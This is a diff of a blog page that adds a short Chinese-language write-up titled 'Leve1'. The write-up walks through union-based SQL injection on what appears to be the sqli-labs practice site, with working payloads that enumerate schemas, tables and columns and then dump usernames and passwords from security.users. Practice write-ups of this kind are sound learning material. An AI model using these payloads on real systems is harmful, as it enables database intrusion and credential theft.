@@ -17,9 +17,25 @@
   <meta name="description" content="BLOG">
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
-  <title>归档 - lll-nnnのblog</title>
+  <title>Leve1 - lll-nnnのblog</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
 
 
 
@@ -47,7 +63,7 @@
 
 
 <body>
-  <header style="height: 60vh;">
+  <header style="height: 70vh;">
     <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
     <a class="navbar-brand"
@@ -146,9 +162,46 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="归档">
+            <span class="h2" id="subtitle" title="Leve1">
               
             </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-01-17 15:02" pubdate>
+        2021年1月17日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      203 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      3
+       分钟
+    </span>
+  
+
+  
+  
+</div>
 
             
           </div>
@@ -161,64 +214,80 @@
 
   <main>
     
-      <div class="container nopadding-md">
-        <div class="py-5" id="board"
-          >
-          
-          <div class="container">
-            <div class="row">
-              <div class="col-12 col-md-10 m-auto">
-                
-
-<div class="list-group">
-  <p class="h4">共计 13 篇文章</p>
-  <hr>
-  
-  
-    
       
-      <p class="h5">2021</p>
-    
-    <a href="/2021/01/17/leve1/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">Leve1</span>
-      <time style="float: right;">01-17</time>
-    </a>
-  
-    
-    <a href="/2021/01/17/BUU003/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">BUU每日一题003</span>
-      <time style="float: right;">01-17</time>
-    </a>
-  
-    
-    <a href="/2021/01/16/BUU002/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">BUU每日一题002</span>
-      <time style="float: right;">01-16</time>
-    </a>
-  
-    
-    <a href="/2021/01/15/GFSJ/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">GFSJ</span>
-      <time style="float: right;">01-15</time>
-    </a>
-  
-    
-    <a href="/2021/01/15/BUU001/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">BUU每日一题001</span>
-      <time style="float: right;">01-15</time>
-    </a>
-  
-</div>
 
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Leve1</h1>
+            
+            <div class="markdown-body">
+              <h2 id="leve1"><a href="#leve1" class="headerlink" title="leve1"></a>leve1</h2><p>输入id=1,有回显；此外，2，3，4……12均有回显，说明有12条数据。</p>
+<p>接下来使用<code>order by 1 %23</code><br><code>order by 1,2 %23</code><br>…….<br>得到一共有三列<br>将id=1改为一个数据库不存在的id值，如861，使用union select 1,2,3联合查询语句查看页面的显示位。<br><img src="https://ftp.bmp.ovh/imgs/2021/01/7fe5a0b12e1c7810.png" srcset="/img/loading.gif"><br>2，3两个显示位；<br><code>id=33&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 %23</code> 得到库名<img src="https://ftp.bmp.ovh/imgs/2021/01/e273266cd62bab04.png" srcset="/img/loading.gif"><br>获取security库中的表<br><code>id=33&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;) %23</code><img src="https://ftp.bmp.ovh/imgs/2021/01/bff49f0f721798e4.png" srcset="/img/loading.gif"><br>users下的列名<code>id=88&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;) %23</code><br><img src="https://ftp.bmp.ovh/imgs/2021/01/fd5c32324cb27880.png" srcset="/img/loading.gif"></p>
+<p>username:<code>id=88&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(username) from security.users) %23</code><br><img src="https://ftp.bmp.ovh/imgs/2021/01/a68dcca44529904f.png" srcset="/img/loading.gif"><br>password:<code>id=88&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(password) from security.users) %23</code><br><img src="https://ftp.bmp.ovh/imgs/2021/01/79f09d504315ca8b.png" srcset="/img/loading.gif"></p>
 
-
-
-
-              </div>
             </div>
-          </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/noet/">noet</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/01/17/BUU003/">
+                        <span class="hidden-mobile">BUU每日一题003</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
         </div>
       </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
     
 
     
@@ -301,9 +370,15 @@
 
 
 
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
 
 
 
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
 
 
 
